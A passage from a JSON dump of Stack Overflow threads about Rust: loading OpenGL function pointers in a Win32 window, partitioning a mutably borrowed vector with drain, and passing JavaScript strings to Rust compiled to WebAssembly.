"view_count": 696, "favorite_count": 0, "accepted_answer_id": 49034511, "answer_count": 1, "score": 2, "last_activity_date": 1519836055, "creation_date": 1519788185, "question_id": 49021466, "link": "https://stackoverflow.com/questions/49021466/win32-opengl-window-in-rust-unable-to-load-certain-function-pointers", "title": "Win32 OpenGL Window in rust: unable to load certain function pointers", "body": "<pre><code>#[cfg(windows)] extern crate winapi;\n\n#[cfg(windows)] use winapi::shared::windef::HWND;\n#[cfg(windows)] use winapi::shared::windef::HMENU;\n#[cfg(windows)] use winapi::shared::windef::HBRUSH;\n#[cfg(windows)] use winapi::shared::minwindef::HINSTANCE;\n\n#[cfg(windows)] use winapi::shared::minwindef::UINT;\n#[cfg(windows)] use winapi::shared::minwindef::DWORD;\n#[cfg(windows)] use winapi::shared::minwindef::WPARAM;\n#[cfg(windows)] use winapi::shared::minwindef::LPARAM;\n#[cfg(windows)] use winapi::shared::minwindef::LRESULT;\n#[cfg(windows)] use winapi::um::winnt::LPCWSTR;\n\n#[cfg(windows)] use winapi::um::winuser::WS_OVERLAPPEDWINDOW;\n#[cfg(windows)] use winapi::um::winuser::WS_VISIBLE;\n#[cfg(windows)] use winapi::um::winuser::WNDCLASSW;\n\n#[cfg(windows)] use std::os::windows::ffi::OsStrExt;\n#[cfg(windows)] use std::ffi::OsStr;\n\n#[cfg(windows)] use std::os::raw::c_void;\n#[cfg(windows)] use winapi::um::libloaderapi::GetProcAddress;\n#[cfg(windows)] use gl::types::*;\n\n// Vertex data\nstatic VERTEX_DATA: [GLfloat; 6] = [0.0, 0.5, 0.5, -0.5, -0.5, -0.5];\n\n// Shader sources\nstatic VS_SRC: &amp;'static str = \"\n#version 150\nin vec2 position;\nvoid main() {\n    gl_Position = vec4(position, 0.0, 1.0);\n}\";\n\nstatic FS_SRC: &amp;'static str = \"\n#version 150\nout vec4 out_color;\nvoid main() {\n    out_color = vec4(1.0, 1.0, 1.0, 1.0);\n}\";\n\nmod gl\n{\n    include!(concat!(env!(\"OUT_DIR\"), \"/bindings.rs\"));\n}\n\n#[cfg(windows)]\nfn to_wstring(str : &amp;str) -&gt; Vec&lt;u16&gt;\n{\n    let v : Vec&lt;u16&gt; =\n            OsStr::new(str).encode_wide().chain(Some(0).into_iter()).collect();\n    v\n}\n\n#[cfg(windows)]\npub unsafe extern \"system\" fn window_proc(h_wnd :HWND,\n    msg :UINT, w_param :WPARAM, l_param :LPARAM) -&gt; LRESULT\n{\n    if msg == winapi::um::winuser::WM_DESTROY {\n        winapi::um::winuser::PostQuitMessage(0i32);\n    }\n    return winapi::um::winuser::DefWindowProcW(h_wnd, msg, w_param, l_param);\n}\n\nfn draw_gl_scene(window_width: i32, window_height: i32,\n        h_dc: winapi::shared::windef::HDC)\n{\n    unsafe\n    {\n        let module = winapi::um::libloaderapi::LoadLibraryW(to_wstring(\"opengl32.dll\")  .as_ptr());\n\n        // gl::load_with(|s| GetProcAddress(module,\n        //         s.as_ptr() as *const i8) as *const c_void);\n\n        gl::Viewport::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        if gl::Viewport::is_loaded() {\n            gl::Viewport(0, 0, window_width, window_height);\n        } else {\n            panic!(\"gl::Viewport was not loaded\")\n        }\n\n        gl::ClearColor::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        if gl::ClearColor::is_loaded() {\n            gl::ClearColor(0.12109375f32, 0.12109375f32, 0.12109375f32, 1.0f32);\n        } else {\n            panic!(\"gl::ClearColor was not loaded\")\n        }\n\n        gl::GetError::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        let error_check_value: GLenum = gl::GetError();\n\n        /*\n        gl::CreateShader::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        let mut vertex_shader_id = 0u32;\n        if gl::CreateShader::is_loaded() {\n            vertex_shader_id = gl::CreateShader(gl::VERTEX_SHADER);\n        } else {\n            panic!(\"gl::CreateShader was not loaded\")\n        }\n        */\n\n        /*\n        let c_str = std::ffi::CString::new(VS_SRC.as_bytes()).unwrap();\n        gl::ShaderSource::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        if gl::ShaderSource::is_loaded() {\n            gl::ShaderSource(vertex_shader_id, 1, &amp;c_str.as_ptr(), std::ptr::null_mut());\n        } else {\n            // panic!(\"gl::ShaderSource was not loaded\")\n        }\n        gl::CompileShader::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        if gl::CompileShader::is_loaded() {\n            gl::CompileShader(vertex_shader_id);\n        } else {\n            // panic!(\"gl::CompileShader was not loaded\")\n        }\n        let mut vertex_array_id: GLuint = 0u32;\n        gl::GenVertexArrays::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        if gl::GenVertexArrays::is_loaded() {\n            gl::GenVertexArrays(1, &amp;mut vertex_array_id as *mut u32);\n        } else {\n            panic!(\"gl::GenVertexArrays was not loaded\")\n        }\n        */\n\n        gl::Clear::load_with(|s| GetProcAddress(module,\n                s.as_ptr() as *const i8) as *const c_void);\n        if gl::Clear::is_loaded() {\n            gl::Clear(gl::COLOR_BUFFER_BIT | gl::DEPTH_BUFFER_BIT |     gl::STENCIL_BUFFER_BIT);\n        } else {\n            panic!(\"gl::Clear was not loaded\")\n        }\n        winapi::um::wingdi::SwapBuffers(h_dc);\n    }\n}\n\nfn main()\n{\n  unsafe\n  {\n    let class_name = to_wstring(\"OpenGL\");\n\n    let h_instance = winapi::um::libloaderapi::GetModuleHandleW(std::ptr::null_mut());\n    let wnd = WNDCLASSW {\n        style: 0,\n        lpfnWndProc: Some(window_proc),\n        cbClsExtra: 0,\n        cbWndExtra: 0,\n        hInstance: h_instance,\n        hIcon: winapi::um::winuser::LoadIconW(0 as HINSTANCE,\n                                              winapi::um::winuser::IDI_APPLICATION),\n        hCursor: winapi::um::winuser::LoadCursorW(0 as HINSTANCE,\n                                                  winapi::um::winuser::IDI_APPLICATION),\n        hbrBackground: 16 as HBRUSH,\n        lpszMenuName: 0 as LPCWSTR,\n        lpszClassName: class_name.as_ptr(),\n    };\n\n    winapi::um::winuser::RegisterClassW(&amp;wnd);\n\n    let window_width = 640;\n    let window_height = 480;\n    let h_wnd_window = winapi::um::winuser::CreateWindowExW(0, class_name.as_ptr(),\n                       to_wstring(\"OpenGL Example\").as_ptr(), WS_OVERLAPPEDWINDOW |     WS_VISIBLE,\n                       0, 0, window_width, window_height, 0 as HWND, 0 as HMENU,    h_instance,\n                       std::ptr::null_mut());\n\n    let mut msg = winapi::um::winuser::MSG {\n        hwnd : 0 as HWND,\n        message : 0 as UINT,\n        wParam : 0 as WPARAM,\n        lParam : 0 as LPARAM,\n        time : 0 as DWORD,\n        pt : winapi::shared::windef::POINT { x: 0, y: 0, },\n    };\n\n    let h_dc = winapi::um::winuser::GetDC(h_wnd_window);\n    let pfd = winapi::um::wingdi::PIXELFORMATDESCRIPTOR {\n        nSize: std::mem::size_of::&lt;winapi::um::wingdi::PIXELFORMATDESCRIPTOR&gt;() as u16,\n        nVersion: 1,\n        dwFlags: winapi::um::wingdi::PFD_DRAW_TO_WINDOW\n                | winapi::um::wingdi::PFD_SUPPORT_OPENGL |  winapi::um::wingdi::PFD_DOUBLEBUFFER,\n        iPixelType: winapi::um::wingdi::PFD_TYPE_RGBA,\n        cColorBits: 64,\n        cRedBits: 0,\n        cRedShift: 0,\n        cGreenBits: 0,\n        cGreenShift: 0,\n        cBlueBits: 0,\n        cBlueShift: 0,\n        cAlphaBits: 0,\n        cAlphaShift: 0,\n        cAccumBits: 0,\n        cAccumRedBits: 0,\n        cAccumGreenBits: 0,\n        cAccumBlueBits: 0,\n        cAccumAlphaBits: 0,\n        cDepthBits: 32,\n        cStencilBits: 8,\n        cAuxBuffers: 0,\n        iLayerType: winapi::um::wingdi::PFD_MAIN_PLANE,\n        bReserved: 0,\n        dwLayerMask: 0,\n        dwVisibleMask: 0,\n        dwDamageMask: 0,\n    };\n\n    let pixel_format = winapi::um::wingdi::ChoosePixelFormat(h_dc,\n            &amp;pfd as *const winapi::um::wingdi::PIXELFORMATDESCRIPTOR);\n    winapi::um::wingdi::SetPixelFormat(h_dc, pixel_format,\n            &amp;pfd as *const winapi::um::wingdi::PIXELFORMATDESCRIPTOR);\n    let h_rc = winapi::um::wingdi::wglCreateContext(h_dc);\n    winapi::um::wingdi::wglMakeCurrent(h_dc, h_rc);\n    winapi::um::winuser::ShowWindow(h_wnd_window, winapi::um::winuser::SW_SHOW);\n\n    loop\n    {\n        if winapi::um::winuser::PeekMessageW(&amp;mut msg, 0u32 as HWND, 0u32, 0u32,\n                                             winapi::um::winuser::PM_REMOVE) &gt; 0i32 {\n            if msg.message == winapi::um::winuser::WM_QUIT {\n                break;\n            } else {\n                winapi::um::winuser::TranslateMessage(&amp;mut msg);\n                winapi::um::winuser::DispatchMessageW(&amp;mut msg);\n            }\n\n        } else {\n            draw_gl_scene(window_width, window_height, h_dc);\n        }\n    }\n  }\n}\n</code></pre>\n\n<p>The above code is the version of my implementation of the outdated project located here: <a href=\"https://www.codeproject.com/tips/1053658/win-gui-programming-in-rust-language/\" rel=\"nofollow noreferrer\">https://www.codeproject.com/tips/1053658/win-gui-programming-in-rust-language/</a></p>\n\n<p>Using the latest version of winapi and gl_generator as the sole two dependencies, I expanded on the starter code to successfully render an OpenGL context in tandem with the Win32 API as opposed to the glfw as suggested by the contributors of the cargo crate gl-rs. When run on a Windows machine, this project as it is presents a dark screen, as seen in <a href=\"https://i.stack.imgur.com/ANGUV.png\" rel=\"nofollow noreferrer\">this link.</a></p>\n\n<p>Any further attempt to render something more substantial has been fruitless thus far, due to an inability to load any function pointers that relate to shaders or vertex buffer objects.</p>\n\n<p>If you comb over the function draw_gl_scene, you'll see that I have a generic \"load_with\" function commented out and a series of function-specific \"load_with\" functions alongside execution code or panics depending on whether the function in question \"is_loaded\". The generic \"load_with\" I've curbed for the time being until writing function-specific \"load-with\" functions is no longer tenable.</p>\n\n<p>As for CreateShader, ShaderSource, CompileShader, and GenVertexArrays, none of them successfully load if I uncomment any of them. I'm sure this is a user error, The odds that one of winapi and gl-rs or an anomalistic interaction between winapi and gl_generator is the cause is unlikely. I'm at my wit's end as to how to resolve this. I appreciate your time if you've read this far.</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519783117, "post_id": 49020804, "comment_id": 85046903, "body": "<i>this does not consume the original vector</i> \u2014 you <b>cannot</b> consume something you don&#39;t own. That&#39;s just fundamental Rust. Why do you <i>want</i> to?"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519783832, "post_id": 49020804, "comment_id": 85047093, "body": "Probably a duplicate of <a href=\"https://stackoverflow.com/q/27098694/155423\">How can I swap in a new value for a field in a mutable reference to a structure?</a>"}, {"owner": {"reputation": 131, "user_id": 2848373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a1987fc2d3a8a7c5cb68964f0befb6e?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. Kevin", "link": "https://stackoverflow.com/users/2848373/mr-kevin"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519861925, "post_id": 49020804, "comment_id": 85086404, "body": "@Shepmaster What I really want is for retain() to return a vector of the removed elements, but partition() was the closest thing I found, so I figured I could re-populate the mutable vector after the call to partition.  It&#39;s possible that I&#39;m using the wrong tool for the job, and I should just iterate with a for loop and use swap_remove_back.  (My actual code is using VecDeque)"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519870290, "post_id": 49020804, "comment_id": 85088437, "body": "Do think that this is a duplicate of <a href=\"https://stackoverflow.com/q/46651354/155423\">Is there a way to drain parts of a vector based on a predicate?</a> then? Seems like it to me."}, {"owner": {"reputation": 131, "user_id": 2848373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a1987fc2d3a8a7c5cb68964f0befb6e?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. Kevin", "link": "https://stackoverflow.com/users/2848373/mr-kevin"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519954350, "post_id": 49020804, "comment_id": 85127959, "body": "It&#39;s close, but this question is more about how into_iter interacts with borrowing, and neither of the answers there have the workaround that @Jmb provides below."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519954718, "post_id": 49020804, "comment_id": 85128074, "body": "<i>and neither of the answers</i> \u2014 because it&#39;s in the <b>question</b> already."}], "answers": [{"tags": [], "owner": {"reputation": 339, "user_id": 9210924, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-4wYHrjZFWfw/AAAAAAAAAAI/AAAAAAAAAEs/Ql3GeOp43dk/photo.jpg?sz=128", "display_name": "Daniel Wilkins", "link": "https://stackoverflow.com/users/9210924/daniel-wilkins"}, "is_accepted": false, "score": 1, "last_activity_date": 1519787244, "creation_date": 1519787244, "answer_id": 49021342, "question_id": 49020804, "link": "https://stackoverflow.com/questions/49020804/how-can-i-partition-a-mutably-borrowed-vector/49021342#49021342", "title": "How can I partition a mutably borrowed vector?", "body": "<p>The reason is that the IntoIterator trait is implemented differently for <code>&amp;'a mut Vec&lt;T&gt;</code> and <code>&amp;'a Vec&lt;T&gt;</code> then it is for <code>Vec&lt;T&gt;</code>. The First two create an iterator by value where as the <code>Vec&lt;T&gt;</code> version creates a consuming iterator, that is, one that moves each value out of the vector (from start to end). The vector cannot be used after calling <code>into_iter()</code>. So you can think of the first two <code>&amp;'a mut Vec&lt;T&gt;</code> and <code>&amp;'a Vec&lt;T&gt;</code> as using the values inside the reference to the Vector to create an iterator. Where as the <code>Vec&lt;T&gt;</code> you can think of it removing the values out of the <code>Vec&lt;T&gt;</code> and putting them into the iterator. Shepmaster's comment of not being able to consume something that you don't own is the reason why they are implemented differently.</p>\n\n<p>Also be aware that there is different ways to get an iterator. \nFrom the Rust documentation:</p>\n\n<ul>\n<li><code>iter()</code>, which iterates over <code>&amp;T</code>.</li>\n<li><code>iter_mut()</code>, which iterates over <code>&amp;mut T</code>.</li>\n<li><code>into_iter()</code>, which iterates over <code>T</code>.</li>\n</ul>\n\n<p>So you could also keep the function the same without doing <code>(&amp;*a)</code> by using <code>iter()</code> instead of <code>into_iter()</code>.</p>\n\n<pre><code>fn doit(a: &amp;mut Vec&lt;i32&gt;) {\n    let (even, odd): (Vec&lt;i32&gt;, Vec&lt;i32&gt;) = a.iter().partition(|&amp;n| n % 2 == 0);\n    println!(\"even {:?}, odd {:?}, a {:?}\", even, odd, a);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 8877, "user_id": 5397009, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/7405bb106a62e8a3ea2d6d787b7261ee?s=128&d=identicon&r=PG&f=1", "display_name": "Jmb", "link": "https://stackoverflow.com/users/5397009/jmb"}, "is_accepted": true, "score": 4, "last_activity_date": 1519805785, "creation_date": 1519805785, "answer_id": 49024852, "question_id": 49020804, "link": "https://stackoverflow.com/questions/49020804/how-can-i-partition-a-mutably-borrowed-vector/49024852#49024852", "title": "How can I partition a mutably borrowed vector?", "body": "<p>As others have implied, you can't move the original vector since you don't own it. However you can move all the values out of the vector, leaving it empty. This can be accomplished with the <a href=\"https://doc.rust-lang.org/std/vec/struct.Vec.html#method.drain\" rel=\"nofollow noreferrer\">drain</a> method:</p>\n\n<pre><code>fn doit(a: &amp;mut Vec&lt;i32&gt;) {\n    let (even, odd): (Vec&lt;i32&gt;, Vec&lt;i32&gt;) = a.drain(..).partition(|&amp;n| n % 2 == 0);\n    println!(\"even {:?}, odd {:?}, a {:?}\", even, odd, a);\n}\n</code></pre>\n\n<p><a href=\"https://play.integer32.com/?gist=62dc2d797d2c66cd851cd73657ae271f&amp;version=stable\" rel=\"nofollow noreferrer\">playground</a></p>\n"}], "owner": {"reputation": 131, "user_id": 2848373, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a1987fc2d3a8a7c5cb68964f0befb6e?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. Kevin", "link": "https://stackoverflow.com/users/2848373/mr-kevin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 802, "favorite_count": 0, "accepted_answer_id": 49024852, "answer_count": 2, "score": 1, "last_activity_date": 1519805785, "creation_date": 1519782822, "last_edit_date": 1519783063, "question_id": 49020804, "link": "https://stackoverflow.com/questions/49020804/how-can-i-partition-a-mutably-borrowed-vector", "title": "How can I partition a mutably borrowed vector?", "body": "<p>If I have a local, mutable vector, I can partition it as follows, copied from the documentation of <code>partition</code>.</p>\n\n<pre><code>let mut a = vec![1, 2, 3, 4];\nlet (even, odd): (Vec&lt;i32&gt;, Vec&lt;i32&gt;) = a.into_iter().partition(|&amp;n| n % 2 == 0);\n</code></pre>\n\n<p>The <code>a</code> vector is consumed (moved) in this process.  However, the same call to partition doesn't work if I have a borrowed mutable reference.  If I try to use the same code in that case, I get the error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error[E0277]: the trait bound `std::vec::Vec&lt;i32&gt;: std::iter::Extend&lt;&amp;mut i32&gt;` is not satisfied\n --&gt; src/main.rs:2:59\n  |\n2 |     let (even, odd): (Vec&lt;i32&gt;, Vec&lt;i32&gt;) = a.into_iter().partition(|n| **n % 2 == 0);\n  |                                                           ^^^^^^^^^ the trait `std::iter::Extend&lt;&amp;mut i32&gt;` is not implemented for `std::vec::Vec&lt;i32&gt;`\n  |\n  = help: the following implementations were found:\n            &lt;std::vec::Vec&lt;T&gt; as std::iter::Extend&lt;&amp;'a T&gt;&gt;\n            &lt;std::vec::Vec&lt;T&gt; as std::iter::Extend&lt;T&gt;&gt;\n</code></pre>\n\n<p>Based on <a href=\"https://stackoverflow.com/questions/41366896/how-to-make-a-rust-mutable-reference-immutable\">How to make a Rust mutable reference immutable?</a>, I wrote the following, which compiles and puts the right values into <code>even</code> and <code>odd</code>.</p>\n\n<pre><code>fn doit(a: &amp;mut Vec&lt;i32&gt;) {\n    let (even, odd): (Vec&lt;i32&gt;, Vec&lt;i32&gt;) = (&amp;*a).into_iter().partition(|&amp;n| n % 2 == 0);\n    println!(\"even {:?}, odd {:?}, a {:?}\", even, odd, a);\n}\n</code></pre>\n\n<p>However, this does not consume the original vector, even though I'm using <code>into_iter()</code>.  There's something about mutability, borrowing, or iterators that I'm just not getting here.</p>\n"}, {"tags": ["javascript", "string", "rust", "webassembly"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1519754804, "post_id": 49014610, "comment_id": 85035218, "body": "WebAssembly doesn&#39;t have the concept of strings. It only has numbers. See the related <a href=\"https://stackoverflow.com/q/47529643/155423\">How to return a string (or similar) from Rust in WebAssembly?</a>"}, {"owner": {"reputation": 6045, "user_id": 3983557, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/01A0D.jpg?s=128&g=1", "display_name": "JF Bastien", "link": "https://stackoverflow.com/users/3983557/jf-bastien"}, "edited": false, "score": 0, "creation_date": 1519758145, "post_id": 49014610, "comment_id": 85037026, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/47529643/how-to-return-a-string-or-similar-from-rust-in-webassembly\">How to return a string (or similar) from Rust in WebAssembly?</a>"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1519759471, "post_id": 49014610, "comment_id": 85037738, "body": "Never, <b>ever</b> return Rust types (e.g. <code>&amp;str</code>) across an FFI boundary. Check out my <a href=\"http://jakegoulding.com/rust-ffi-omnibus/\" rel=\"nofollow noreferrer\">Rust FFI Omnibus</a>. While it doesn&#39;t have anything for WebAssembly (yet), the concepts are all still valid."}, {"owner": {"reputation": 1470, "user_id": 2075745, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/6f9a084d236381e1882c4e28edb5151f?s=128&d=identicon&r=PG", "display_name": "user25064", "link": "https://stackoverflow.com/users/2075745/user25064"}, "edited": false, "score": 0, "creation_date": 1519760649, "post_id": 49014610, "comment_id": 85038396, "body": "for practical uses, I think serializing the types in cap&#39;n proto or protobuf is a sensible thing to do for crossing FFI boundaries"}], "answers": [{"comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 3, "creation_date": 1519759494, "post_id": 49016376, "comment_id": 85037747, "body": "<i>which is just what Rust is expecting as <code>str</code></i> \u2014 this is <b>not</b> what a <code>&amp;str</code> (note the ampersand) is. A <code>&amp;str</code> is a pointer to data <i>and a length</i>, where the pointer is to a set of <code>u8</code>, not <code>u16</code>. You are not passing the length anywhere. You should never have such a type in a FFI function."}, {"owner": {"reputation": 1097, "user_id": 2432221, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/bed6ad096ee60b399a63414cc8448453?s=128&d=identicon&r=PG", "display_name": "vinzdef", "link": "https://stackoverflow.com/users/2432221/vinzdef"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519759799, "post_id": 49016376, "comment_id": 85037918, "body": "What would be a better solution?"}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519760370, "post_id": 49016376, "comment_id": 85038243, "body": "You have to do the same as the linked question, but in reverse. You&#39;ll need to decide on an encoding (such as UTF-8 or UTF-16), put that encoded data into a buffer, decide on how to transfer that pointer and length across the boundary, then &quot;just do it&quot;."}], "tags": [], "owner": {"reputation": 1097, "user_id": 2432221, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/bed6ad096ee60b399a63414cc8448453?s=128&d=identicon&r=PG", "display_name": "vinzdef", "link": "https://stackoverflow.com/users/2432221/vinzdef"}, "is_accepted": false, "score": -2, "last_activity_date": 1519759732, "last_edit_date": 1519759732, "creation_date": 1519759167, "answer_id": 49016376, "question_id": 49014610, "link": "https://stackoverflow.com/questions/49014610/passing-a-javascript-string-to-a-rust-function-compiled-to-webassembly/49016376#49016376", "title": "Passing a JavaScript string to a Rust function compiled to WebAssembly", "body": "<p>As pointed out by Shepmaster, only numbers can be passed to WebAssembly, so we need to convert the string into an <code>Uint16Array</code>.</p>\n\n<p>To do so we can use this <code>str2ab</code> function found <a href=\"https://developers.google.com/web/updates/2012/06/How-to-convert-ArrayBuffer-to-and-from-String\" rel=\"nofollow noreferrer\">here</a>:</p>\n\n<pre><code>function str2ab(str) {\n  var buf = new ArrayBuffer(str.length*2); // 2 bytes for each char\n  var bufView = new Uint16Array(buf);\n  for (var i=0, strLen=str.length; i &lt; strLen; i++) {\n    bufView[i] = str.charCodeAt(i);\n  }\n  return buf;\n}\n</code></pre>\n\n<p>This now works:</p>\n\n<pre><code>instance.exports.compute(\n    str2ab(operator), \n    n1, n2\n);\n</code></pre>\n\n<p>Because we're passing a reference to an array of unsigned integers.</p>\n"}, {"comments": [{"owner": {"reputation": 425, "user_id": 2535422, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fcfde34756a8b6a1e98b39b3c7ead924?s=128&d=identicon&r=PG", "display_name": "jfizz", "link": "https://stackoverflow.com/users/2535422/jfizz"}, "edited": false, "score": 2, "creation_date": 1567471358, "post_id": 49020435, "comment_id": 101963398, "body": "Regarding solution 1, how can you be sure that you are not overwriting memory in use by the rust program? Does the rust program allocate on a separate memory arena?"}, {"owner": {"reputation": 1376, "user_id": 5368759, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-EUB19ZQqehM/AAAAAAAAAAI/AAAAAAAAAkQ/t8XfIKGPO34/photo.jpg?sz=128", "display_name": "Fuyang Liu", "link": "https://stackoverflow.com/users/5368759/fuyang-liu"}, "edited": false, "score": 0, "creation_date": 1580991945, "post_id": 49020435, "comment_id": 106285094, "body": "So the stuff mentioned here is not working yet or? <a href=\"https://rustwasm.github.io/docs/wasm-bindgen/reference/types/string.html\" rel=\"nofollow noreferrer\">rustwasm.github.io/docs/wasm-bindgen/reference/types/&hellip;</a>"}], "tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": true, "score": 16, "last_activity_date": 1558710404, "last_edit_date": 1558710404, "creation_date": 1519779991, "answer_id": 49020435, "question_id": 49014610, "link": "https://stackoverflow.com/questions/49014610/passing-a-javascript-string-to-a-rust-function-compiled-to-webassembly/49020435#49020435", "title": "Passing a JavaScript string to a Rust function compiled to WebAssembly", "body": "<h1>Easiest and most idiomatic solution</h1>\n\n<p>Most people should use <a href=\"https://github.com/rustwasm/wasm-bindgen\" rel=\"noreferrer\">wasm-bindgen</a>, which makes this whole process <em>much</em> simpler!</p>\n\n<h1>Low-level manual implementation</h1>\n\n<p>To transfer string data between JavaScript and Rust, you need to decide</p>\n\n<ol>\n<li>The encoding of the text: UTF-8 (Rust native) or UTF-16 (JS native).</li>\n<li>Who will own the memory buffer: the JS (caller) or Rust (callee).</li>\n<li>How to represent the strings data and length: NUL-terminated (C-style) or distinct length (Rust-style).</li>\n<li>How to communicate the data and length, if they are separate.</li>\n</ol>\n\n<h2>Common setup</h2>\n\n<p>It's important to build C dylibs for WASM to help them be smaller in size.</p>\n\n<p><strong>Cargo.toml</strong></p>\n\n<pre><code>[package]\nname = \"quick-maths\"\nversion = \"0.1.0\"\nauthors = [\"An Devloper &lt;an.devloper@example.com&gt;\"]\n\n[lib]\ncrate-type = [\"cdylib\"]\n</code></pre>\n\n<p><strong>.cargo/config</strong></p>\n\n<pre><code>[target.wasm32-unknown-unknown]\nrustflags = [\n    \"-C\", \"link-args=--import-memory\",\n]\n</code></pre>\n\n<p><strong>package.json</strong></p>\n\n<pre><code>{\n  \"name\": \"quick-maths\",\n  \"version\": \"0.1.0\",\n  \"main\": \"index.js\",\n  \"author\": \"An Devloper &lt;an.devloper@example.com&gt;\",\n  \"license\": \"MIT\",\n  \"scripts\": {\n    \"example\": \"node ./index.js\"\n  },\n  \"dependencies\": {\n    \"fs-extra\": \"^8.0.1\",\n    \"text-encoding\": \"^0.7.0\"\n  }\n}\n</code></pre>\n\n<p>I'm using NodeJS 12.1.0.</p>\n\n<p><strong>Execution</strong></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ rustup component add rust-std --target wasm32-unknown-unknown\n$ cargo build --release --target wasm32-unknown-unknown\n</code></pre>\n\n<h2>Solution 1</h2>\n\n<p>I decided:</p>\n\n<ol>\n<li>To convert JS strings to UTF-8, which means that the <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder\" rel=\"noreferrer\"><code>TextEncoder</code></a> JS API is the best fit.</li>\n<li>The caller should own the memory buffer. </li>\n<li>To have the length be a separate value.</li>\n<li>Another struct and allocation should be made to hold the pointer and 